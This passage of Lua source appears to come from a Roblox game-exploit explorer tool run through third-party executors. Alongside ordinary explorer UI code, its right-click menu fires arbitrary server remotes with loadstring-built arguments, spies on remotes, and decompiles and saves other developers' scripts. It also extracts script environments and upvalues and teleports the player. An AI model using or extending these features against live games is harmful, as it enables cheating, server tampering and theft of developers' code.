		scrollBarH.TotalSpace = nodeWidth
		scrollBarH.VisibleSpace = listFrame.AbsoluteSize.x
		scrollBarH:Update()
		local visible = scrollBarH:CanScrollDown() or scrollBarH:CanScrollUp()
		scrollBarH.GUI.Visible = visible

		listFrame.Size = UDim2.new(1,-GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

		scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
		scrollBar.GUI.Size = UDim2.new(0,GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)
		
		scrollBar.TotalSpace = #TreeList+1
		scrollBar:Update()
	end

	function rawUpdateList()
		-- Clear then repopulate the entire list. It appears to be fast enough.
		TreeList = {}
		nodeWidth = 0
		r(NodeLookup[workspace.Parent])
		if DexStorageEnabled then
			r(NodeLookup[DexStorage])
		end
		if RunningScriptsStorageEnabled then
			r(NodeLookup[RunningScriptsStorage])
		end
		if UpvalueStorageEnabled then
			r(NodeLookup[UpvalueStorage])
		end
		rawUpdateSize()
		updateActions()
	end

	-- Adding or removing large models will cause many updates to occur. We
	-- can reduce the number of updates by creating a delay, then dropping any
	-- updates that occur during the delay.
	local updatingList = false
	function updateList()
		if updatingList then return end
		updatingList = true
		wait(2.25)
		updatingList = false
		rawUpdateList()
	end

	local updatingScroll = false
	function updateScroll()
		if updatingScroll then return end
		updatingScroll = true
		wait(2.25)
		updatingScroll = false
		scrollBar:Update()
	end
end

local Selection do
	local bindGetSelection = explorerPanel:FindFirstChild("GetSelection")
	if not bindGetSelection then
		bindGetSelection = Create('BindableFunction',{Name = "GetSelection"})
		bindGetSelection.Parent = explorerPanel
	end

	local bindSetSelection = explorerPanel:FindFirstChild("SetSelection")
	if not bindSetSelection then
		bindSetSelection = Create('BindableFunction',{Name = "SetSelection"})
		bindSetSelection.Parent = explorerPanel
	end

	local bindSelectionChanged = explorerPanel:FindFirstChild("SelectionChanged")
	if not bindSelectionChanged then
		bindSelectionChanged = Create('BindableEvent',{Name = "SelectionChanged"})
		bindSelectionChanged.Parent = explorerPanel
	end

	local SelectionList = {}
	local SelectionSet = {}
	local Updates = true
	Selection = {
		Selected = SelectionSet;
		List = SelectionList;
	}

	local function addObject(object)
		-- list update
		local lupdate = false
		-- scroll update
		local supdate = false

		if not SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				table.insert(SelectionList,object)
				SelectionSet[object] = true
				node.Selected = true

				-- expand all ancestors so that selected node becomes visible
				node = node.Parent
				while node do
					if not node.Expanded then
						node.Expanded = true
						lupdate = true
					end
					node = node.Parent
				end
				supdate = true
			end
		end
		return lupdate,supdate
	end

	function Selection:Set(objects)
		local lupdate = false
		local supdate = false

		if #SelectionList > 0 then
			for i = 1,#SelectionList do
				local object = SelectionList[i]
				local node = NodeLookup[object]
				if node then
					node.Selected = false
					SelectionSet[object] = nil
				end
			end

			SelectionList = {}
			Selection.List = SelectionList
			supdate = true
		end

		for i = 1,#objects do
			local l,s = addObject(objects[i])
			lupdate = l or lupdate
			supdate = s or supdate
		end

		if lupdate then
			rawUpdateList()
			supdate = true
		elseif supdate then
			scrollBar:Update()
		end

		if supdate then
			bindSelectionChanged:Fire()
			updateActions()
		end
	end

	function Selection:Add(object)
		local l,s = addObject(object)
		if l then
			rawUpdateList()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		elseif s then
			scrollBar:Update()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end
	
	function Selection:StopUpdates()
		Updates = false
	end
	
	function Selection:ResumeUpdates()
		Updates = true
		bindSelectionChanged:Fire()
		updateActions()
	end

	function Selection:Remove(object,noupdate)
		if SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				node.Selected = false
				SelectionSet[object] = nil
				for i = 1,#SelectionList do
					if SelectionList[i] == object then
						table.remove(SelectionList,i)
						break
					end
				end

				if not noupdate then
					scrollBar:Update()
				end
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end

	function Selection:Get()
		local list = {}
		for i = 1,#SelectionList do
			list[i] = SelectionList[i]
		end
		return list
	end

	bindSetSelection.OnInvoke = function(...)
		Selection:Set(...)
	end

	bindGetSelection.OnInvoke = function()
		return Selection:Get()
	end
end

UserInputService.InputBegan:Connect(function(inp,gpe)
    if not gpe and inp.KeyCode == Enum.KeyCode.Delete then
        if not Option.Modifiable then return end
		local list = Selection:Get()
		for i = 1,#list do
			pcall(delete,list[i])
		end
		Selection:Set({})
    end
end)

function CreateCaution(title,msg)
	local newCaution = CautionWindow:Clone()
	newCaution.Title.Text = title
	newCaution.MainWindow.Desc.Text = msg
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

function CreateTableCaution(title,msg)
	if type(msg) ~= "table" then return CreateCaution(title,tostring(msg)) end
	local newCaution = TableCautionWindow:Clone()
	newCaution.Title.Text = title
	
	local TableList = newCaution.MainWindow.TableResults
	local TableTemplate = newCaution.MainWindow.TableTemplate
	
	for i,v in pairs(msg) do
		local newResult = TableTemplate:Clone()
		newResult.Type.Text = type(v)
		newResult.Value.Text = tostring(v)
		newResult.Position = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Parent = TableList
		TableList.CanvasSize = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Visible = true
	end
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Number" then
		return tonumber(value)
	elseif type == "String" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif type == "Script" then
		local success,err = ypcall(function()
		_G.D_E_X_DONOTUSETHISPLEASE = nil
		loadstring(
			"_G.D_E_X_DONOTUSETHISPLEASE = "..value
		)()
		return _G.D_E_X_DONOTUSETHISPLEASE
		end)
		if err then
			return nil
		end
	else
		return nil
	end
end

local function ToPropValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif string.sub(value,1,4) == "Enum" then
		local getEnum = value
		while true do
			local x,y = string.find(getEnum,".")
			if y then
				getEnum = string.sub(getEnum,y+1)
			else
				break
			end
		end
		-- print(getEnum)
		return getEnum
	else
		return nil
	end
end

function PromptRemoteCaller(inst)
	if CurrentRemoteWindow then
		CurrentRemoteWindow:Destroy()
		CurrentRemoteWindow = nil
	end
	CurrentRemoteWindow = RemoteWindow:Clone()
	CurrentRemoteWindow.Parent = explorerPanel.Parent
	CurrentRemoteWindow.Visible = true
	
	local displayValues = false
	
	local ArgumentList = CurrentRemoteWindow.MainWindow.Arguments
	local ArgumentTemplate = CurrentRemoteWindow.MainWindow.ArgumentTemplate
	
	if inst:IsA("RemoteEvent") then
		CurrentRemoteWindow.Title.Text = "Fire Event"
		CurrentRemoteWindow.MainWindow.Ok.Text = "Fire"
		CurrentRemoteWindow.MainWindow.DisplayReturned.Visible = false
		CurrentRemoteWindow.MainWindow.Desc2.Visible = false
	end
	
	local newArgument = ArgumentTemplate:Clone()
	newArgument.Parent = ArgumentList
	newArgument.Visible = true
	newArgument.Type.MouseButton1Down:connect(function()
		createDDown(newArgument.Type,function(choice)
			newArgument.Type.Text = choice
		end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
	end)
	
	CurrentRemoteWindow.MainWindow.Ok.MouseButton1Up:connect(function()
		if CurrentRemoteWindow and inst.Parent ~= nil then
			local MyArguments = {}
			for i,v in pairs(ArgumentList:GetChildren()) do
				table.insert(MyArguments,ToValue(v.Value.Text,v.Type.Text))
			end
			if inst:IsA("RemoteFunction") then
				if displayValues then
					spawn(function()
						local myResults = inst:InvokeServer(unpack(MyArguments))
						if myResults then
							CreateTableCaution("Remote Caller",myResults)
						else
							CreateCaution("Remote Caller","This remote did not return anything.")
						end
					end)
				else
					spawn(function()
						inst:InvokeServer(unpack(MyArguments))
					end)
				end
			else
				inst:FireServer(unpack(MyArguments))
			end
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Add.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			local newArgument = ArgumentTemplate:Clone()
			newArgument.Position = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Parent = ArgumentList
			ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Visible = true
			newArgument.Type.MouseButton1Down:connect(function()
				createDDown(newArgument.Type,function(choice)
					newArgument.Type.Text = choice
				end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
			end)
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Subtract.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			if #ArgumentList:GetChildren() > 1 then
				ArgumentList:GetChildren()[#ArgumentList:GetChildren()]:Destroy()
				ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			end
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.DisplayReturned.MouseButton1Up:connect(function()
		if displayValues then
			displayValues = false
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = false
		else
			displayValues = true
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = true
		end
	end)
end

function PromptSaveInstance(inst)
	if not SaveInstance and not _G.SaveInstance then CreateCaution("SaveInstance Missing","You do not have the SaveInstance function installed. Please go to RaspberryPi's thread to retrieve it.") return end
	if CurrentSaveInstanceWindow then
		CurrentSaveInstanceWindow:Destroy()
		CurrentSaveInstanceWindow = nil
		if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
			explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
		end
	end
	CurrentSaveInstanceWindow = SaveInstanceWindow:Clone()
	CurrentSaveInstanceWindow.Parent = explorerPanel.Parent
	CurrentSaveInstanceWindow.Visible = true
	
	local filename = CurrentSaveInstanceWindow.MainWindow.FileName
	local saveObjects = true
	local overwriteCaution = false
	
	CurrentSaveInstanceWindow.MainWindow.Save.MouseButton1Up:connect(function()
		if readfile and getelysianpath then
			if readfile(getelysianpath()..filename.Text..".rbxmx") then
				if not overwriteCaution then
					overwriteCaution = true
					local newCaution = ConfirmationWindow:Clone()
					newCaution.Name = "SaveInstanceOverwriteCaution"
					newCaution.MainWindow.Desc.Text = "The file, "..filename.Text..".rbxmx, already exists. Overwrite?"
					newCaution.Parent = explorerPanel.Parent
					newCaution.Visible = true
					newCaution.MainWindow.Yes.MouseButton1Up:connect(function()
						ypcall(function()
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						end)
						overwriteCaution = false
						newCaution:Destroy()
						if CurrentSaveInstanceWindow then
							CurrentSaveInstanceWindow:Destroy()
							CurrentSaveInstanceWindow = nil
						end
					end)
					newCaution.MainWindow.No.MouseButton1Up:connect(function()
						overwriteCaution = false
						newCaution:Destroy()
					end)
				end
			else
				ypcall(function()
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				end)
				if CurrentSaveInstanceWindow then
					CurrentSaveInstanceWindow:Destroy()
					CurrentSaveInstanceWindow = nil
					if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
						explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
					end
				end
			end
		else
			ypcall(function()
				if SaveInstance then
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				else
					_G.SaveInstance(inst,filename.Text,not saveObjects)
				end
			end)
			if CurrentSaveInstanceWindow then
				CurrentSaveInstanceWindow:Destroy()
				CurrentSaveInstanceWindow = nil
				if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
					explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
				end
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentSaveInstanceWindow then
			CurrentSaveInstanceWindow:Destroy()
			CurrentSaveInstanceWindow = nil
			if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
				explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.SaveObjects.MouseButton1Up:connect(function()
		if saveObjects then
			saveObjects = false
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = false
		else
			saveObjects = true
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = true
		end
	end)
end

function DestroyRightClick()
	if currentRightClickMenu then
		currentRightClickMenu:Destroy()
		currentRightClickMenu = nil
	end
	if CurrentInsertObjectWindow and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Visible = false
	end
end



function rightClickMenu(sObj)
	local mouse = game:GetService("Players").LocalPlayer:GetMouse()
	
    local options = {
        'Cut',
		'Copy',
		'Copy Path',
		'Paste Into',
		'Duplicate',
        'Delete',
        'Select Children'
    }
    function IsAc(typ)
        local list = Selection:Get()
	    for i = 1,#list do
            if list[i]:IsA(typ) then
                return true
            end
        end
        return false
    end
    if IsAc('BasePart') then
        table.insert(options, 'Teleport To')
    end
    if IsAc('LocalScript') or IsAc('ModuleScript') then
        table.insert(options, 'View Script')
		table.insert(options, 'Save Script')
		table.insert(options, 'Dump Script')
    end
    if IsAc('RemoteEvent') or IsAc('RemoteFunction') then
		table.insert(options, 'Call Remote')
		table.insert(options, 'Spy Remote')
    end
	currentRightClickMenu = CreateRightClickMenu(options, "", false,
		function(option)
			if option == "Cut" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				local cut = {}
				for i = 1,#list do
					local obj = list[i]:Clone()
					if obj then
						table.insert(clipboard,obj)
						table.insert(cut,list[i])
					end
				end
				for i = 1,#cut do
					pcall(delete,cut[i])
				end
				updateActions()
			elseif option == "Copy" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				for i = 1,#list do
					table.insert(clipboard,list[i]:Clone())
				end
				updateActions()
			elseif option == "Paste Into" then
				if not Option.Modifiable then return end
				local parent = Selection.List[1] or workspace
				for i = 1,#clipboard do
					clipboard[i]:Clone().Parent = parent
				end
			elseif option == "Duplicate" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					list[i]:Clone().Parent = Selection.List[1].Parent or workspace
				end
			elseif option == "Delete" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					pcall(delete,list[i])
				end
				Selection:Set({})
			elseif option == "Group" then
				if not Option.Modifiable then return end
				local newModel = Instance.new("Model")
				local list = Selection:Get()
				newModel.Parent = Selection.List[1].Parent or workspace
				for i = 1,#list do
					list[i].Parent = newModel
				end
				Selection:Set({})
			elseif option == "Ungroup" then
				if not Option.Modifiable then return end
				local ungrouped = {}
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("Model") then
						for i2,v2 in pairs(list[i]:GetChildren()) do
							v2.Parent = list[i].Parent or workspace
							table.insert(ungrouped,v2)
						end		
						pcall(delete,list[i])			
					end
				end
				Selection:Set({})
				if SettingsRemote:Invoke("SelectUngrouped") then
					for i,v in pairs(ungrouped) do
						Selection:Add(v)
					end
				end
			elseif option == "Select Children" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				Selection:Set({})
				Selection:StopUpdates()
				for i = 1,#list do
					for i2,v2 in pairs(list[i]:GetChildren()) do
						Selection:Add(v2)
					end
				end
				Selection:ResumeUpdates()
			elseif option == "Teleport To" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("BasePart") then
						pcall(function()
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = list[i].CFrame
						end)
						break
					end
				end
			elseif option == "Dump Script" then
				if not Option.Modifiable then return; end;
				local list = Selection:Get()
				scriptDumper.Enabled = true;
				log(list[#list]);
			elseif option == "Spy Remote" then
				if not Option.Modifiable then return; end;
				local list = Selection:Get();
				dexSpy.Enabled = true;
				currentRemote = list[#list];
			elseif option == "Insert Part" then
				if not Option.Modifiable then return end
				local insertedParts = {}
				local list = Selection:Get()
				for i = 1,#list do
					pcall(function()
						local newPart = Instance.new("Part")
						newPart.Parent = list[i]
						newPart.CFrame = CFrame.new(game:GetService'Players'.LocalPlayer.Character.Head.Position) + Vector3.new(0,3,0)
						table.insert(insertedParts,newPart)
					end)
				end
			elseif option == "Copy Path" then
                if not Option.Modifiable then return; end; 
				local function reconstructPath(path)
					local matches = {};
					for v in path:gmatch("(.-)%.") do
						table.insert(matches, v);
                    end;
                    if #matches >= 1 then
					    local startIndex, endIndex = path:find(matches[#matches]);
                        table.insert(matches, path:sub(endIndex + 2, #path));
                    end;
					local str = "";
					for i, v in pairs(matches) do
						if (not v:find("%s")) and (not v:find("!")) and (not v:find("?")) then
							if i ~= 1 then
								str = str .. "." .. v;
							else
								str = str .. ':GetService("' .. v .. '")';
							end;
						else
							str = str .. '["' .. v .. '"]'  
						end;
					end;
					str = "game" .. str;
					return str;
				end;
				local list = Selection:Get();
				local copied = "";
                for i = 1, #list do
					if list[i]:GetFullName():find("%.") then
						if i == 1 then
							copied = copied .. reconstructPath(list[i]:GetFullName());
						else
							copied = copied .. "\n" .. reconstructPath(list[i]:GetFullName());
						end;
					else
						if i == 1 then
							copied = copied .. 'game:GetService("' .. list[i]:GetFullName() .. '")';
						else
							copied = copied .. "\n" .. 'game:GetService("' .. list[i]:GetFullName() .. '")';
						end;
                    end;
				end;
				setclipboard(copied);
			elseif option == "Save Instance" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				if #list == 1 then
					list[1].Archivable = true
					ypcall(function()PromptSaveInstance(list[1]:Clone())end)
				elseif #list > 1 then
					local newModel = Instance.new("Model")
					newModel.Name = "SavedInstances"
					for i = 1,#list do
						ypcall(function()
							list[i].Archivable = true
							list[i]:Clone().Parent = newModel
						end)
					end
					PromptSaveInstance(newModel)
				end
			elseif option == "Call Remote" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("RemoteFunction") or list[i]:IsA("RemoteEvent") then
						PromptRemoteCaller(list[i])
						break
					end
				end
			elseif option == "Save Script" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("LocalScript") or list[i]:IsA("ModuleScript") then
						if Synapse then
							Synapse:WriteFile(game.PlaceId .. '_' .. list[i].Name:gsub('%W', '') .. '_' .. math.random(100000, 999999) .. '.lua', decompile(list[i]))
						elseif writefile then
							writefile(game.PlaceId .. '_' .. list[i].Name:gsub('%W', '') .. '_' .. math.random(100000, 999999) .. '.lua', decompile(list[i]));
						end
					end
				end
			elseif option == "View Script" then
				-- if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("LocalScript") or list[i]:IsA("ModuleScript") then
						ScriptEditorEvent:Fire(list[i])
					end
				end
			elseif option == 'Try Get Values' then
				for i, sObj in pairs(Selection:Get()) do
					if vars[sObj.Name] or funcs[sObj.Name] then
						local var = vars[sObj.Name] or funcs[sObj.Name]
						if var then
							if type(var) == 'table' then
								local T = var;
								-- table.sort(T, cmp)
								for i,v in pairs(T) do
									local n = Instance.new('StringValue', sObj);
									n.Name = tostring(i);
									local a, b = pcall(function()
										return tostring(v);
									end)
									n.Value = a and b or '.undefined';
									if (type(v) == 'function') then
										funcs[i] = v;
									else
										vars[i] = v;
									end
								end
							elseif type(var) == 'function' then
								local T = debug.getupvalues(var);
								-- table.sort(T, cmp)
								for i,v in pairs(T) do
									local n = Instance.new('StringValue', sObj);
									n.Name = tostring(i);
									local a, b = pcall(function()
										return tostring(v);
									end)
									n.Value = a and b or '.undefined';
									if (type(v) == 'function') then
										funcs[i] = v;
									else
										vars[i] = v;
									end
								end
							end
						end
					end
					if typeof(sObj) == 'Instance' and (sObj:IsA'LocalScript' or sObj:IsA'ModuleScript') then
						do -- get script env values
							local T = getsenv(sObj);
							for i,v in pairs(T) do
								if not sObj:FindFirstChild(tostring(i)) then
									local n = Instance.new('StringValue', sObj);
									n.Name = tostring(i);
									local a, b = pcall(function()
										return tostring(v);
									end)
									n.Value = a and b or '.undefined';
									if (type(v) == 'function') then
										funcs[i] = v;
										for fn, p in pairs(debug.getupvalues(v)) do
											if not sObj:FindFirstChild(tostring(fn)) then
												local n = Instance.new('StringValue', sObj);
												n.Name = tostring(fn);
												local a, b = pcall(function()
													return tostring(p);
												end)
												n.Value = a and b or '.undefined';
												if (type(p) == 'function') then
													funcs[fn] = p;
												else
													vars[fn] = p;
												end
											end
										end
									else
										vars[i] = v;
									end
								end
							end
						end
						--[[do -- attempt to get upvalue variables
							for i,v in pairs(getreg()) do
								if typeof(v) == 'function' then
									local T = debug.getupvalues(v);
									for i,v in pairs(T) do
										if not sObj:FindFirstChild(tostring(i)) then
											local n = Instance.new('StringValue', sObj);
											n.Name = tostring(i);
											local a, b = pcall(function()
												return tostring(v);
											end)
											n.Value = a and b or '.undefined';
											if (type(v) == 'function') then
												for _, p in pairs(debug.getupvalues(v)) do
													if not sObj:FindFirstChild(tostring(_)) then
														local n = Instance.new('StringValue', sObj);
														n.Name = tostring(_);
														local a, b = pcall(function()
															return tostring(p);
														end)
														n.Value = a and b or '.undefined';
													end
												end
											end
										end
									end
								end
							end
						end]]
					end
				end
			elseif option == 'Dump Function' then
				if funcs[sObj.Name] then
					local var = funcs[sObj.Name]
					if var then
						if type(var) == 'function' then
							if writefile then
								writefile(game.PlaceId .. '_' .. 'DF' .. '_' .. math.random(100000, 999999) .. '.lua', decompile(var));
							end
						end
					end
				end
			elseif option == 'Refresh Instances' then
				for i,v in pairs(getscripts()) do
					if v ~= RunningScriptsStorage and v ~= DexStorage and v ~= UpvalueStorage then
						if (v:IsA'LocalScript' or v:IsA'ModuleScript' or v:IsA'Script') then
							v.Archivable = true;
							local ls = v:clone()
							if v:IsA'LocalScript' or v:IsA'Script' then ls.Disabled = true; end
							ls.Parent = RunningScriptsStorageMain
						end
					end
				end
			elseif option == 'Track' then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					pcall(function()
						local name = list[i].Name;
						if list[i].Parent:FindFirstChildOfClass'Humanoid' then
							name = list[i].Parent.Name;
						end
						_G.Track(list[i], name, list[i].BrickColor.Color);
					end)
				end
			end
	end)
	currentRightClickMenu.Parent = explorerPanel.Parent
	currentRightClickMenu.Position = UDim2.new(0,mouse.X,0,mouse.Y)
	if currentRightClickMenu.AbsolutePosition.X + currentRightClickMenu.AbsoluteSize.X > explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X then
		currentRightClickMenu.Position = UDim2.new(0, explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X - currentRightClickMenu.AbsoluteSize.X, 0, mouse.Y)
	end
end

local function cancelReparentDrag()end
local function cancelSelectDrag()end
do
	local listEntries = {}
	local nameConnLookup = {}

	local mouseDrag = Create('ImageButton',{
		Name = "MouseDrag";
		Position = UDim2.new(-0.25,0,-0.25,0);
		Size = UDim2.new(1.5,0,1.5,0);
		Transparency = 1;
		AutoButtonColor = false;
		Active = true;
		ZIndex = 10;
	})
	local function dragSelect(last,add,button)
		local connDrag
		local conUp

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local pos = Vector2.new(x,y) - listFrame.AbsolutePosition
			local size = listFrame.AbsoluteSize
			if pos.x < 0 or pos.x > size.x or pos.y < 0 or pos.y > size.y then return end

			local i = math.ceil(pos.y/ENTRY_BOUND) + scrollBar.ScrollIndex
			-- Mouse may have made a large step, so interpolate between the
			-- last index and the current.
			for n = i<last and i or last, i>last and i or last do
				local node = TreeList[n]
				if node then
					if add then
						Selection:Add(node.Object)
					else
						Selection:Remove(node.Object)
					end
				end
			end
			last = i
		end)

		function cancelSelectDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			function cancelSelectDrag()end
		end

		conUp = mouseDrag[button]:connect(cancelSelectDrag)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local function dragReparent(object,dragGhost,clickPos,ghostOffset)
		local connDrag
		local conUp
		local conUp2

		local parentIndex = nil
		local dragged = false

		local parentHighlight = Create('Frame',{
			Transparency = 1;
			Visible = false;
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(1,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,1,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
		})
		SetZIndex(parentHighlight,9)

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local dragPos = Vector2.new(x,y)
			if dragged then
				local pos = dragPos - listFrame.AbsolutePosition
				local size = listFrame.AbsoluteSize

				parentIndex = nil
				parentHighlight.Visible = false
				if pos.x >= 0 and pos.x <= size.x and pos.y >= 0 and pos.y <= size.y + ENTRY_SIZE*2 then
					local i = math.ceil(pos.y/ENTRY_BOUND-2)
					local node = TreeList[i + scrollBar.ScrollIndex]
					if node and node.Object ~= object and not object:IsAncestorOf(node.Object) then
						parentIndex = i
						local entry = listEntries[i]
						if entry then
							parentHighlight.Visible = true
							parentHighlight.Position = UDim2.new(0,1,0,entry.AbsolutePosition.y-listFrame.AbsolutePosition.y)
							parentHighlight.Size = UDim2.new(0,size.x-4,0,entry.AbsoluteSize.y)
						end
					end
				end

				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
			elseif (clickPos-dragPos).magnitude > 8 then
				dragged = true
				SetZIndex(dragGhost,9)
				dragGhost.IndentFrame.Transparency = 0.25
				dragGhost.IndentFrame.EntryText.TextColor3 = GuiColor.TextSelected
				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
				dragGhost.Parent = GetScreen(listFrame)
				parentHighlight.Parent = listFrame
			end
		end)

		function cancelReparentDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
